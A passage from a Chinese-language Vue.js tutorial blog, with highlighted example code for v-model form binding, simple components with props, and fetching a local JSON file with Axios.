class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    输入的文本：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"hello"</span>&gt;</span>&#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../js/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            message:<span class="string">""</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="多行文本"><a href="#多行文本" class="headerlink" title="多行文本"></a>多行文本</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    多行文本：<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&amp;nbsp;&amp;nbsp;多行文本是：&#123;&#123;message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            message:<span class="string">"Hello hello!"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="单复选框"><a href="#单复选框" class="headerlink" title="单复选框"></a>单复选框</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    单复选框：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"checked"</span>&gt;</span></span><br><span class="line">    &amp;nbsp;&amp;nbsp;</span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"checkbox"</span>&gt;</span>&#123;&#123;checked&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            checked:<span class="literal">false</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="多复选框"><a href="#多复选框" class="headerlink" title="多复选框"></a>多复选框</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    多复选框：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"jack"</span> <span class="attr">value</span>=<span class="string">"Jack"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></span><br><span class="line">    &amp;nbsp;&amp;nbsp;</span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"jack"</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"join"</span> <span class="attr">value</span>=<span class="string">"Join"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></span><br><span class="line">    &amp;nbsp;&amp;nbsp;</span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"join"</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"mike"</span> <span class="attr">value</span>=<span class="string">"Mike"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></span><br><span class="line">    &amp;nbsp;&amp;nbsp;</span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"mike"</span>&gt;</span>Mike<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>选中的值：&#123;&#123;checkedNames&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            checkedNames:[]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="★下拉框"><a href="#★下拉框" class="headerlink" title="★下拉框"></a>★下拉框</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    性别：</span></span><br><span class="line"><span class="comment">        &lt;input type="radio" name="sex" value="男" v-model="pan"&gt;男</span></span><br><span class="line"><span class="comment">        &lt;input type="radio" name="sex" value="女" v-model="pan"&gt;女</span></span><br><span class="line"><span class="comment">        &lt;p&gt;选中了：&#123;&#123;pan&#125;&#125;&lt;/p&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">    下拉框:</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">"pan"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">disabled</span>&gt;</span>---请选择---<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>A<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>B<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>C<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>D<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>value:&#123;&#123;pan&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            pan:<span class="string">"A"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：<code>v-model</code>表达式的初始值未能匹配任何选项，元系将被渲染为“未选中”状态。 在iOS中， 这会使用户无法选择第一个选项，因为这样的情况下，iOS不会触发<code>change</code>事件。因此，更推荐像上面这样提供一个值为空的禁用选项。</p>
<h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><p>组件是可复用的<code>Vue</code>实例， 说白了就是一组可以重复使用的模板， 跟<code>JSTL</code>的自定义标签、<code>Thymeleal</code>的<code>th:fragment</code>等框架有着异曲同工之妙，通常一个应用会以一棵嵌套的组件树的形式来组织：</p>
<p>例如，你可能会有页头、侧边栏、内容区等组件，每个组件又包含了其它的像导航链接、博文之类的组件。</p>
<h4 id="第一个Vue组件"><a href="#第一个Vue组件" class="headerlink" title="第一个Vue组件"></a>第一个Vue组件</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层 模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s1nd0re1</span>&gt;</span><span class="tag">&lt;/<span class="name">s1nd0re1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//定义一个Vue组件</span></span></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"s1nd0re1"</span>,&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template:'<span class="tag">&lt;<span class="name">li</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">li</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><p><code>Vue.component()</code>：注册组件</p>
</li>
<li><p><code>pan</code>：自定义组件的名字</p>
</li>
<li><p><code>template</code>：组件的模板</p>
</li>
</ul>
<h4 id="使用props属性传递参数"><a href="#使用props属性传递参数" class="headerlink" title="使用props属性传递参数"></a>使用props属性传递参数</h4><p>像上面那样用组件没有任何意义，所以我们是需要传递参数到组件的，此时就需要使用<code>props</code>属性了！</p>
<p><strong>注意：默认规则下props属性里的值不能为大写；</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层 模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    组件 给组件中的值--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s1nd0re1</span> <span class="attr">v-for</span>=<span class="string">"item in items"</span> <span class="attr">v-bind:content</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">s1nd0re1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//定义一个Vue组件</span></span></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"s1nd0re1"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">        props:[<span class="string">'content'</span>],</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template:'<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123;content&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            items:[<span class="string">"Java"</span>,<span class="string">"Linux"</span>,<span class="string">"前端"</span>]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>说明</strong>：</p>
<ul>
<li><p><code>v-for=&quot;item in items&quot;</code>：遍历<code>Vue</code>实例中定义的名为<code>items</code>的数组，并创建同等数量的组件</p>
</li>
<li><p><code>v-bind:panh=&quot;item&quot;</code>：将遍历的<code>item</code>项绑定到组件中<code>props</code>定义名为<code>item</code>属性上；= 号左边的<code>content</code>为<code>props</code>定义的属性名，右边的为<code>item in items</code> 中遍历的item项的值</p>
</li>
</ul>
<p>或者最简单的理解就是 <code>content</code>是形参，<code>item</code>是实参  <code>props</code>理解为有参构造</p>
<h2 id="Axios异步通信"><a href="#Axios异步通信" class="headerlink" title="Axios异步通信"></a>Axios异步通信</h2><h3 id="什么是Axios"><a href="#什么是Axios" class="headerlink" title="什么是Axios"></a>什么是Axios</h3><p>Axios是一个开源的可以用在浏览器端和<code>Node JS</code>的异步通信框架， 她的主要作用就是实现AJAX异步通信，其功能特点如下：</p>
<ul>
<li><p>从浏览器中创建<code>XMLHttpRequests</code></p>
</li>
<li><p>从node.js创建http请求</p>
</li>
<li><p>支持Promise API[JS中链式编程]</p>
</li>
<li><p>拦截请求和响应</p>
</li>
<li><p>转换请求数据和响应数据</p>
</li>
<li><p>取消请求</p>
</li>
<li><p>自动转换JSON数据</p>
</li>
<li><p>客户端支持防御XSRF(跨站请求伪造)</p>
</li>
</ul>
<p>GitHub：<a href="https://github.com/axios/axios" target="_blank" rel="noopener">https://github.com/axios/axios</a><br>  <br>中文文档：<br><a href="http://www.axios-js.com/" target="_blank" rel="noopener">http://www.axios-js.com/</a></p>
<h3 id="为什么要使用Axios"><a href="#为什么要使用Axios" class="headerlink" title="为什么要使用Axios"></a>为什么要使用Axios</h3><p>由于<code>Vue.js</code>是一个视图层框架并且作者(尤雨溪) 严格准守SoC(关注度分离原则)所以<code>Vue.js</code>并不包含AJAX的通信功能， 为了解决通信问题， 作者单独开发了一个名为<code>vue-resource</code>的插件， 不过在进入2.0版本以后停止了对该插件的维护并推荐了<code>Axios</code>框架。少用jQuery， 因为它操作Dom太频繁!</p>
<h3 id="第一个Axios应用程序"><a href="#第一个Axios应用程序" class="headerlink" title="第一个Axios应用程序"></a>第一个Axios应用程序</h3><p>首先需要一段JSON数据<br>data.json<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"狂神说Java"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://blog.kuangstudy.com"</span>,</span><br><span class="line">  <span class="attr">"page"</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"isNonProfit"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"address"</span>: &#123;</span><br><span class="line">    <span class="attr">"street"</span>: <span class="string">"含光门"</span>,</span><br><span class="line">    <span class="attr">"city"</span>: <span class="string">"陕西西安"</span>,</span><br><span class="line">    <span class="attr">"country"</span>: <span class="string">"中国"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"links"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"bilibili"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://space.bilibili.com/95256449"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"狂神说Java"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://blog.kuangstudy.com"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"百度"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"https://www.baidu.com/"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>测试代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-binf</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--v-cloak 解决闪烁问题--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"vue"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>地名：&#123;&#123;info.name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>地址：&#123;&#123;info.address.country&#125;&#125;--&#123;&#123;info.address.city&#125;&#125;--&#123;&#123;info.address.street&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>链接：<span class="tag">&lt;<span class="name">a</span> <span class="attr">v-binf:href</span>=<span class="string">"info.url"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>&#123;&#123;info.url&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入js文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#vue"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//data：属性：vm</span></span></span><br><span class="line">        data()&#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line">                info:&#123;</span><br><span class="line"><span class="actionscript">                    name:<span class="literal">null</span>,</span></span><br><span class="line">                    address:&#123;</span><br><span class="line"><span class="actionscript">                        country:<span class="literal">null</span>,</span></span><br><span class="line"><span class="actionscript">                        city:<span class="literal">null</span>,</span></span><br><span class="line"><span class="actionscript">                        street:<span class="literal">null</span></span></span><br><span class="line">                    &#125;,</span><br><span class="line"><span class="actionscript">                    url:<span class="literal">null</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        mounted()&#123;<span class="comment">//钩子函数</span></span></span><br><span class="line">            axios</span><br><span class="line"><span class="actionscript">                .get(<span class="string">'data.json'</span>)</span></span><br><span class="line"><span class="javascript">                .then(<span class="function"><span class="params">response</span>=&gt;</span>(<span class="keyword">this</span>.info=response.data));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这个代码是官方原版的代码，但是根据弹幕大神的方法 修改为下面的情况也可以正常使用  还不知道区别在哪里<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span 